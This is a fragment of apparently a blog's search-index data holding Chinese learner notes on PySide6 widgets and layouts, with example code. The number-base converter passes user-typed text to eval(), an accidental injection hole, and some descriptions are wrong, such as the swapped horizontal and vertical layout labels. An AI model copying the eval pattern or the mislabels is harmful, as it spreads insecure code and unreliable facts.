class_\">MyWindow</span>(QWidget, Ui_Form):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.setupUi(self)<br>        self.dct = &#123;<span class=\"hljs-string\">&#x27;2&#x27;</span>: <span class=\"hljs-string\">&#x27;bin&#x27;</span>, <span class=\"hljs-string\">&#x27;8&#x27;</span>: <span class=\"hljs-string\">&#x27;oct&#x27;</span>, <span class=\"hljs-string\">&#x27;10&#x27;</span>: <span class=\"hljs-string\">&#x27;int&#x27;</span>, <span class=\"hljs-string\">&#x27;16&#x27;</span>: <span class=\"hljs-string\">&#x27;hex&#x27;</span>&#125;<br>        self.dct2 = &#123;<span class=\"hljs-string\">&#x27;2&#x27;</span>: <span class=\"hljs-string\">&#x27;0b&#x27;</span>, <span class=\"hljs-string\">&#x27;8&#x27;</span>: <span class=\"hljs-string\">&#x27;0o&#x27;</span>, <span class=\"hljs-string\">&#x27;10&#x27;</span>: <span class=\"hljs-string\">&#x27;&#x27;</span>, <span class=\"hljs-string\">&#x27;16&#x27;</span>: <span class=\"hljs-string\">&#x27;0x&#x27;</span>&#125;<br>        self.bind()<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">any_to_ten</span>(<span class=\"hljs-params\">self, num, fm</span>):<br>        qz = self.dct2[fm]<br>        string_num = qz+<span class=\"hljs-built_in\">str</span>(num)<br>        text = <span class=\"hljs-string\">f&#x27;int(&quot;<span class=\"hljs-subst\">&#123;string_num&#125;</span>&quot;, <span class=\"hljs-subst\">&#123;fm&#125;</span>)&#x27;</span><br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;any_to_ten: &#x27;</span> + text)<br>        <span class=\"hljs-keyword\">try</span>:<br>            result = <span class=\"hljs-built_in\">eval</span>(text)<br>            <span class=\"hljs-keyword\">return</span> result<br>        <span class=\"hljs-keyword\">except</span>:<br>            <span class=\"hljs-keyword\">pass</span><br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">ten_to_any</span>(<span class=\"hljs-params\">self, num, fm</span>):<br>        qz = self.dct[fm]<br>        text = <span class=\"hljs-string\">f&#x27;<span class=\"hljs-subst\">&#123;qz&#125;</span>(<span class=\"hljs-subst\">&#123;num&#125;</span>)&#x27;</span><br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;ten_to_any: &#x27;</span> + text)<br>        <span class=\"hljs-keyword\">try</span>:<br>            result = <span class=\"hljs-built_in\">eval</span>(text)<br>            <span class=\"hljs-keyword\">return</span> result<br>        <span class=\"hljs-keyword\">except</span>:<br>            <span class=\"hljs-keyword\">pass</span><br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">calc</span>(<span class=\"hljs-params\">self, num, raw_format, want_format</span>):<br>        ten = self.any_to_ten(num, raw_format)<br>        result = self.ten_to_any(ten, want_format)<br>        self.textEdit.setText(<span class=\"hljs-built_in\">str</span>(result))<br>        <span class=\"hljs-comment\"># return result</span><br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">bind</span>(<span class=\"hljs-params\">self</span>):<br>        self.lineEdit.textChanged.connect(<br>            <span class=\"hljs-keyword\">lambda</span>: self.calc(self.lineEdit.text(), self.comboBox.currentText(), self.comboBox_3.currentText())<br>        )<br><br>        self.comboBox.currentTextChanged.connect(<br>            <span class=\"hljs-keyword\">lambda</span>: self.calc(self.lineEdit.text(), self.comboBox.currentText(), self.comboBox_3.currentText())<br>        )<br><br>        self.comboBox_3.currentTextChanged.connect(<br>            <span class=\"hljs-keyword\">lambda</span>: self.calc(self.lineEdit.text(), self.comboBox.currentText(), self.comboBox_3.currentText())<br>        )<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n\n\n<p>我觉得还是挺完美的！！</p>\n<p>让gpt来解释一下</p>\n\n","categories":["PySide6"],"tags":["python"]},{"title":"PySide6学习笔记#6","url":"/2023/04/27/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-6/","content":"<p>今天又是讲控件</p>\n<p>QRadioButton、QButtonGroup、QTextEdit、QPlainTextEdit</p>\n<span id=\"more\"></span>\n\n<h1 id=\"QRadioButton-amp-QButtonGroup\"><a href=\"#QRadioButton-amp-QButtonGroup\" class=\"headerlink\" title=\"QRadioButton &amp;  QButtonGroup\"></a>QRadioButton &amp;  QButtonGroup</h1><p>顾名思义就是单选框以及单选框组</p>\n<p>具体属性信号啥的可以去qt助手里面看，</p>\n<p>这个比较重要的就是有一个group的功能，</p>\n<p>可以自己去课程里面看，讲的很简单易懂</p>\n<p>代码因为需要其他的布局组件，</p>\n<p>还没有学过，</p>\n<p>所以这个按钮组不会直接显示出来，</p>\n<p>留个坑，学了垂直、水平布局就回来完善代码，</p>\n<p>但是可以先放上chatgpt的代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-comment\"># 这段代码没有将按钮添加到主窗口的布局中，</span><br><span class=\"hljs-comment\"># 因此按钮不会在窗口中显示。</span><br><span class=\"hljs-comment\"># 需要使用布局管理器将按钮添加到主窗口中，</span><br><span class=\"hljs-comment\"># 例如使用QVBoxLayout或QHBoxLayout来垂直或水平排列按钮。以下是一个可能的示例：</span><br><br><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QMainWindow, QRadioButton, QPushButton, QButtonGroup, QVBoxLayout, QWidget<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QMainWindow</span>):  <span class=\"hljs-comment\"># 创建一个类</span><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()  <span class=\"hljs-comment\"># 继承QMainWindow的属性</span><br><br>        <span class=\"hljs-comment\"># 创建两个垂直布局，一个用于性别按钮，一个用于国家按钮</span><br>        layout_sex = QVBoxLayout()<br>        layout_country = QVBoxLayout()<br><br>        <span class=\"hljs-comment\"># 性别按钮组</span><br>        self.group_sex = QButtonGroup(self)<br>        btn1 = QRadioButton(<span class=\"hljs-string\">&#x27;male&#x27;</span>)<br>        btn2 = QRadioButton(<span class=\"hljs-string\">&#x27;female&#x27;</span>)<br>        self.group_sex.addButton(btn1)<br>        self.group_sex.addButton(btn2)<br>        layout_sex.addWidget(btn1)<br>        layout_sex.addWidget(btn2)<br><br>        <span class=\"hljs-comment\"># 国家按钮组</span><br>        self.group_country = QButtonGroup(self)<br>        btn3 = QRadioButton(<span class=\"hljs-string\">&#x27;China&#x27;</span>)<br>        btn4 = QRadioButton(<span class=\"hljs-string\">&#x27;Japan&#x27;</span>)<br>        self.group_country.addButton(btn3)<br>        self.group_country.addButton(btn4)<br>        layout_country.addWidget(btn3)<br>        layout_country.addWidget(btn4)<br><br>        <span class=\"hljs-comment\"># 创建一个QWidget作为主窗口的中心部件，并将两个布局添加到该QWidget上</span><br>        central_widget = QWidget()<br>        central_widget.setLayout(QVBoxLayout())<br>        central_widget.layout().addLayout(layout_sex)<br>        central_widget.layout().addLayout(layout_country)<br>        self.setCentralWidget(central_widget)<br><br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:  <span class=\"hljs-comment\"># 入口函数</span><br>    app = QApplication([])  <span class=\"hljs-comment\"># 创建一个对象</span><br>    window = MyWindow()  <span class=\"hljs-comment\"># 再创建一个对象</span><br>    window.show()  <span class=\"hljs-comment\"># 执行类的方法</span><br>    app.<span class=\"hljs-built_in\">exec</span>()<br><span class=\"hljs-comment\"># 在此示例中，我们首先创建了两个垂直布局，</span><br><span class=\"hljs-comment\"># 一个用于性别按钮，一个用于国家按钮。</span><br><span class=\"hljs-comment\"># 然后，将每个按钮添加到其相应的布局中。</span><br><span class=\"hljs-comment\"># 接下来，我们创建一个QWidget作为主窗口的中心部件，</span><br><span class=\"hljs-comment\"># 并将两个布局添加到该QWidget上。最后，我们将QWidget设置为主窗口的中心部件。</span><br><span class=\"hljs-comment\"># 这样，当主窗口显示时，按钮将被添加到主窗口的布局中，并在窗口中显示。</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2023-x2F-4-x2F-29回来补坑\"><a href=\"#2023-x2F-4-x2F-29回来补坑\" class=\"headerlink\" title=\"2023&#x2F;4&#x2F;29回来补坑\"></a>2023&#x2F;4&#x2F;29回来补坑</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QRadioButton, QButtonGroup, QVBoxLayout, QHBoxLayout, QFormLayout<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):  <span class=\"hljs-comment\"># 创建一个类</span><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()  <span class=\"hljs-comment\"># 继承QMainWindow的属性</span><br><br>        self.group1 = QButtonGroup(self)<br>        btn1 = QRadioButton(<span class=\"hljs-string\">&#x27;男&#x27;</span>)<br>        btn2 = QRadioButton(<span class=\"hljs-string\">&#x27;女&#x27;</span>)<br>        self.group1.addButton(btn1)<br>        self.group1.addButton(btn2)<br><br>        self.group2 = QButtonGroup(self)<br>        btn3 = QRadioButton(<span class=\"hljs-string\">&#x27;上海&#x27;</span>)<br>        btn4 = QRadioButton(<span class=\"hljs-string\">&#x27;北京&#x27;</span>)<br>        self.group2.addButton(btn3)<br>        self.group2.addButton(btn4)<br><br>        self.layout1 = QHBoxLayout()<br>        self.layout1.addWidget(btn1)<br>        self.layout1.addWidget(btn2)<br><br>        self.layout2 = QHBoxLayout()<br>        self.layout2.addWidget(btn3)<br>        self.layout2.addWidget(btn4)<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addLayout(self.layout1)<br>        self.mainLayout.addLayout(self.layout2)<br>        self.setLayout(self.mainLayout)<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:  <span class=\"hljs-comment\"># 入口函数</span><br>    app = QApplication([])  <span class=\"hljs-comment\"># 创建一个对象</span><br>    window = MyWindow()  <span class=\"hljs-comment\"># 再创建一个对象</span><br>    window.show()  <span class=\"hljs-comment\"># 执行类的方法</span><br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>讲一下我的坑，</p>\n<p>首先就是前面chatgpt给的是QMainWindow，</p>\n<p>建议别用，用QWidget</p>\n<p>然后就是这个ButtonGroup，</p>\n<p>我很好奇为什么在布局addwidget的时候，</p>\n<p>不是添加buttongroup，</p>\n<p>而是添加ButtonGroup里面的按钮。。。</p>\n<p><strong>在创建每一个button对象后，</strong></p>\n<p><strong>一定要加入到group里面去！</strong></p>\n<h3 id=\"2023-x2F-4-x2F-30回来报道\"><a href=\"#2023-x2F-4-x2F-30回来报道\" class=\"headerlink\" title=\"2023&#x2F;4&#x2F;30回来报道\"></a>2023&#x2F;4&#x2F;30回来报道</h3><p>前面的问题解决了，问了一下up</p>\n<p>意思就是buttongroup就是个“代码层的管理”</p>\n<p>（我知道我理解的不对</p>\n<p>（但是这么理解至少能解决我的疑惑</p>\n<h3 id=\"2023-x2F-5-x2F-1回来报道\"><a href=\"#2023-x2F-5-x2F-1回来报道\" class=\"headerlink\" title=\"2023&#x2F;5&#x2F;1回来报道\"></a>2023&#x2F;5&#x2F;1回来报道</h3><p>昨天笔记中的控件小结有buttongroup，</p>\n<p>再次有了新的认识：</p>\n<p>buttongroup就像公司里的部门经理，</p>\n<p>有事情都是先找部门的经理问话，</p>\n<p>但是领工资的时候是部门里面的员工都要领，</p>\n<p>就是add widget的时候button group里面的button都要添加，</p>\n<p>但是group里面的button触发了事件可以通过group来知道</p>\n<h3 id=\"绑定事件\"><a href=\"#绑定事件\" class=\"headerlink\" title=\"绑定事件\"></a>绑定事件</h3><p>然后就是要给这些按钮添加事件，</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QRadioButton, QButtonGroup, QVBoxLayout, QHBoxLayout, QFormLayout<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):  <span class=\"hljs-comment\"># 创建一个类</span><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()  <span class=\"hljs-comment\"># 继承QMainWindow的属性</span><br><br>        self.group1 = QButtonGroup(self)<br>        btn1 = QRadioButton(<span class=\"hljs-string\">&#x27;男&#x27;</span>)<br>        btn2 = QRadioButton(<span class=\"hljs-string\">&#x27;女&#x27;</span>)<br>        self.group1.addButton(btn1)<br>        self.group1.addButton(btn2)<br>        btn1.clicked.connect(self.print_)<br>        btn2.clicked.connect(self.print_)<br><br>        self.group2 = QButtonGroup(self)<br>        btn3 = QRadioButton(<span class=\"hljs-string\">&#x27;上海&#x27;</span>)<br>        btn4 = QRadioButton(<span class=\"hljs-string\">&#x27;北京&#x27;</span>)<br>        self.group2.addButton(btn3)<br>        self.group2.addButton(btn4)<br>        btn3.clicked.connect(self.print_)<br>        btn4.clicked.connect(self.print_)<br><br>        self.layout1 = QHBoxLayout()<br>        self.layout1.addWidget(btn1)<br>        self.layout1.addWidget(btn2)<br><br>        self.layout2 = QHBoxLayout()<br>        self.layout2.addWidget(btn3)<br>        self.layout2.addWidget(btn4)<br><br>        self.mainLayout = QVBoxLayout()<br>        self.mainLayout.addLayout(self.layout1)<br>        self.mainLayout.addLayout(self.layout2)<br>        self.setLayout(self.mainLayout)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">print_</span>(<span class=\"hljs-params\">self</span>):<br>        a = self.group1.checkedButton()<br>        b = self.group2.checkedButton()<br>        <span class=\"hljs-keyword\">if</span> a <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> <span class=\"hljs-literal\">None</span> <span class=\"hljs-keyword\">and</span> b <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> <span class=\"hljs-literal\">None</span>:<br>            <span class=\"hljs-built_in\">print</span>(a.text())<br>            <span class=\"hljs-built_in\">print</span>(b.text())<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:  <span class=\"hljs-comment\"># 入口函数</span><br>    app = QApplication([])  <span class=\"hljs-comment\"># 创建一个对象</span><br>    window = MyWindow()  <span class=\"hljs-comment\"># 再创建一个对象</span><br>    window.show()  <span class=\"hljs-comment\"># 执行类的方法</span><br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"QTextEdit\"><a href=\"#QTextEdit\" class=\"headerlink\" title=\"QTextEdit\"></a>QTextEdit</h1><p>这个就是普通的输入框，</p>\n<p>与lineEdit的不同之处在于，</p>\n<p>他这个是可以编辑不止一行的内容</p>\n<p>（例如你的记事本不可能只输入一行</p>\n<p>但是他和下面的plaintextedit相比的话，</p>\n<p>个人觉得，</p>\n<p>只是在代码形式上有区别，</p>\n<p>毕竟他也是可以使用HTML和markdown文本的，</p>\n<p>up也说了，推荐这个纯文本的</p>\n<p>代码参考：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QTextEdit, QPushButton<br><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyGui</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.text = QTextEdit(<span class=\"hljs-string\">&#x27;test&#x27;</span>, self)<br>        btn = QPushButton(<span class=\"hljs-string\">&#x27;按钮&#x27;</span>, self)<br>        btn.setGeometry(<span class=\"hljs-number\">20</span>, <span class=\"hljs-number\">20</span>, <span class=\"hljs-number\">100</span>, <span class=\"hljs-number\">50</span>)<br>        btn.clicked.connect(self.change_text)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">change_text</span>(<span class=\"hljs-params\">self</span>):<br>        self.text.setMarkdown(<span class=\"hljs-string\">&#x27;**MarkDown加粗文字**&#x27;</span>)<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyGui()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>为了更加的直观，</p>\n<p>需要点击一下按钮之后才显示markdown字体</p>\n<h1 id=\"QPlainTextEdit\"><a href=\"#QPlainTextEdit\" class=\"headerlink\" title=\"QPlainTextEdit\"></a>QPlainTextEdit</h1><p>这个类似于一个编辑器，</p>\n<p>（个人感觉像是markdown编辑器</p>\n<p>有加粗，倾斜，下划线啥的</p>\n<p>但是up也说了不推荐</p>\n<p>代码参考：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QMainWindow, QPlainTextEdit, QPushButton<br><br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QMainWindow</span>):  <span class=\"hljs-comment\"># 创建一个类</span><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()  <span class=\"hljs-comment\"># 继承QMainWindow的属性</span><br>        self.line = QPlainTextEdit(self)<br>        self.line.setPlainText(<span class=\"hljs-string\">&#x27;test&#x27;</span>)<br>        self.line.setGeometry(<span class=\"hljs-number\">50</span>, <span class=\"hljs-number\">50</span>, <span class=\"hljs-number\">200</span>, <span class=\"hljs-number\">100</span>)<br>        btn = QPushButton(<span class=\"hljs-string\">&#x27;按钮&#x27;</span>, self)<br>        btn.clicked.connect(self.append_text)<br><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">append_text</span>(<span class=\"hljs-params\">self</span>):<br>        self.line.appendPlainText(<span class=\"hljs-string\">&#x27;添加的内容&#x27;</span>)<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:  <span class=\"hljs-comment\"># 入口函数</span><br>    app = QApplication([])  <span class=\"hljs-comment\"># 创建一个对象</span><br>    window = MyWindow()  <span class=\"hljs-comment\"># 再创建一个对象</span><br>    window.show()  <span class=\"hljs-comment\"># 执行类的方法</span><br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>这里又出现了一个离谱的bug，</p>\n<p>如果不set他的pos的话，</p>\n<p>你是无法看见这个plaintextedit的，</p>\n<p>似乎他不像其他的组件设置了默认位置。。。</p>\n\n\n<p>死活找不到，</p>\n<p>我估计是原视频设置了layout的原因才可以看到，</p>\n\n\n<p>问了newbing便豁然开朗，</p>\n<p>加上设置位置就行了</p>\n","categories":["PySide6"],"tags":["python"]},{"title":"PySide6学习笔记#8","url":"/2023/04/29/PySide6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-8/","content":"<p>今天学习常用控件最后一节课、</p>\n<p>常见布局以及布局的作用</p>\n<span id=\"more\"></span>\n\n<h1 id=\"常用控件最后一节课\"><a href=\"#常用控件最后一节课\" class=\"headerlink\" title=\"常用控件最后一节课\"></a>常用控件最后一节课</h1><p>今天up讲了一个有用的东西，</p>\n<p>就是在qt designer里面设置信号，</p>\n\n\n<p>点开之后就可以根据相关因素绑定信号了</p>\n\n\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication,QWidget, QSlider<br><span class=\"hljs-keyword\">from</span> PySide6.QtCore <span class=\"hljs-keyword\">import</span> Qt<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        slider = QSlider(Qt.Orientation.Horizontal, self)   <span class=\"hljs-comment\"># 设置水平滑条</span><br>        slider.setMinimum(<span class=\"hljs-number\">50</span>)    <span class=\"hljs-comment\"># 从50开始计数一直到500</span><br>        slider.setMaximum(<span class=\"hljs-number\">500</span>)<br>        slider.setTickInterval(<span class=\"hljs-number\">20</span>)    <span class=\"hljs-comment\"># 刻度间隔</span><br>        slider.setTickPosition(QSlider.TickPosition.TicksBelow)  <span class=\"hljs-comment\"># 刻度位置</span><br>        slider.valueChanged.connect(<span class=\"hljs-keyword\">lambda</span>: <span class=\"hljs-built_in\">print</span>(slider.value()))<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>效果图：</p>\n\n\n<p>👌</p>\n<h1 id=\"常见布局以及布局的作用\"><a href=\"#常见布局以及布局的作用\" class=\"headerlink\" title=\"常见布局以及布局的作用\"></a>常见布局以及布局的作用</h1><p>常见的3种布局：</p>\n<ul>\n<li><p>垂直布局 —— QHBoxLayout——就是横着排的</p>\n</li>\n<li><p>水平布局 —— QVBoxLayout——就是竖着排的</p>\n</li>\n<li><p>格子布局 —— QGirdLayout</p>\n</li>\n<li><p>表单布局 —— QFormLayout</p>\n</li>\n</ul>\n<h2 id=\"水平布局-amp-垂直布局\"><a href=\"#水平布局-amp-垂直布局\" class=\"headerlink\" title=\"水平布局 &amp; 垂直布局\"></a>水平布局 &amp; 垂直布局</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QWidget, QApplication, QVBoxLayout, QPushButton, QLabel, QLineEdit<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br><br>        self.mainLayout = QVBoxLayout()   <span class=\"hljs-comment\"># 创建一个布局 垂直布局</span><br>        self.mainLayout.addWidget(QLabel(<span class=\"hljs-string\">&#x27;账号：&#x27;</span>))<br>        self.mainLayout.addWidget(QLineEdit())<br>        self.mainLayout.addWidget(QLabel(<span class=\"hljs-string\">&#x27;密码：&#x27;</span>))<br>        self.mainLayout.addWidget(QLineEdit())<br>        self.mainLayout.addWidget(QPushButton(<span class=\"hljs-string\">&#x27;登录&#x27;</span>))<br>        <span class=\"hljs-string\">&quot;&quot;&quot;</span><br><span class=\"hljs-string\">        添加组件</span><br><span class=\"hljs-string\">        这里就不需要写self了因为已经在垂直布局里面了 </span><br><span class=\"hljs-string\">        现在这个按钮会随着用户调整窗口而自适应大小</span><br><span class=\"hljs-string\">        &quot;&quot;&quot;</span><br>        self.setLayout(self.mainLayout)   <span class=\"hljs-comment\"># 设置布局 传入布局控件</span><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"嵌套\"><a href=\"#嵌套\" class=\"headerlink\" title=\"嵌套\"></a>嵌套</h3><p>就像windows的文件夹一样，</p>\n<p>可以嵌套</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QWidget, QApplication, QVBoxLayout, QPushButton, QLabel, QLineEdit, QHBoxLayout<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):<br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()<br>        self.mainLayout2 = QVBoxLayout()<br><br>        self.mainLayout1 = QHBoxLayout()   <span class=\"hljs-comment\"># 创建一个布局 垂直布局</span><br>        self.mainLayout1.addWidget(QLabel(<span class=\"hljs-string\">&#x27;账号：&#x27;</span>))<br>        self.mainLayout1.addWidget(QLineEdit())<br><br>        self.mainLayout2.addLayout(self.mainLayout1)<br><br>        self.mainLayout = QHBoxLayout()<br>        self.mainLayout.addWidget(QLabel(<span class=\"hljs-string\">&#x27;密码：&#x27;</span>))<br>        self.mainLayout.addWidget(QLineEdit())<br><br>        self.mainLayout2.addLayout(self.mainLayout)<br><br>        self.mainLayout2.addWidget(QPushButton(<span class=\"hljs-string\">&#x27;登录&#x27;</span>))<br>        <span class=\"hljs-string\">&quot;&quot;&quot;</span><br><span class=\"hljs-string\">        添加组件</span><br><span class=\"hljs-string\">        这里就不需要写self了因为已经在垂直布局里面了 </span><br><span class=\"hljs-string\">        现在这个按钮会随着用户调整窗口而自适应大小</span><br><span class=\"hljs-string\">        &quot;&quot;&quot;</span><br>        self.setLayout(self.mainLayout2)   <span class=\"hljs-comment\"># 设置布局 传入布局控件</span><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:<br>    app = QApplication([])<br>    window = MyWindow()<br>    window.show()<br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>要注意添加布局时addLayout，</p>\n\n\n<p>现在是个美观的登录界面了</p>\n<h2 id=\"表单布局\"><a href=\"#表单布局\" class=\"headerlink\" title=\"表单布局\"></a>表单布局</h2><p>感觉这个和别的没什么区别，</p>\n<p>就是addrow是标签+组件而已</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QFormLayout, QPushButton, QVBoxLayout, QLineEdit<br><br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">MyWindow</span>(<span class=\"hljs-title class_ inherited__\">QWidget</span>):  <span class=\"hljs-comment\"># 创建一个类</span><br>    <span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">__init__</span>(<span class=\"hljs-params\">self</span>):<br>        <span class=\"hljs-built_in\">super</span>().__init__()  <br><br>        self.mainLayout = QVBoxLayout()<br><br>        self.form_layout = QFormLayout()  <span class=\"hljs-comment\"># 表单布局</span><br>        self.form_layout.addRow(<span class=\"hljs-string\">&#x27;账号&#x27;</span>, QLineEdit())<br><br>        self.form_layout2 = QFormLayout()  <span class=\"hljs-comment\"># 表单布局</span><br>        self.form_layout2.addRow(<span class=\"hljs-string\">&#x27;密码&#x27;</span>, QLineEdit())<br><br>        self.mainLayout.addLayout(self.form_layout)<br>        self.mainLayout.addLayout(self.form_layout2)<br>        self.mainLayout.addWidget(QPushButton(<span class=\"hljs-string\">&#x27;登录&#x27;</span>))<br>        self.setLayout(self.mainLayout)<br><br><br><span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">&#x27;__main__&#x27;</span>:  <span class=\"hljs-comment\"># 入口函数</span><br>    app = QApplication([])  <span class=\"hljs-comment\"># 创建一个对象</span><br>    window = MyWindow()  <span class=\"hljs-comment\"># 再创建一个对象</span><br>    window.show()  <span class=\"hljs-comment\"># 执行类的方法</span><br>    app.<span class=\"hljs-built_in\">exec</span>()<br></code></pre></td></tr></table></figure>\n\n<p>实现效果和之前一样，就是代码变少了</p>\n<h2 id=\"格子布局\"><a href=\"#格子布局\" class=\"headerlink\" title=\"格子布局\"></a>格子布局</h2><p>第一个想到的就是前面的项目计算器</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> PySide6.QtWidgets <span class=\"hljs-keyword\">import</span> QApplication, QWidget, QPushButton, QVBoxLayout, QGridLayout<br><br><br><span 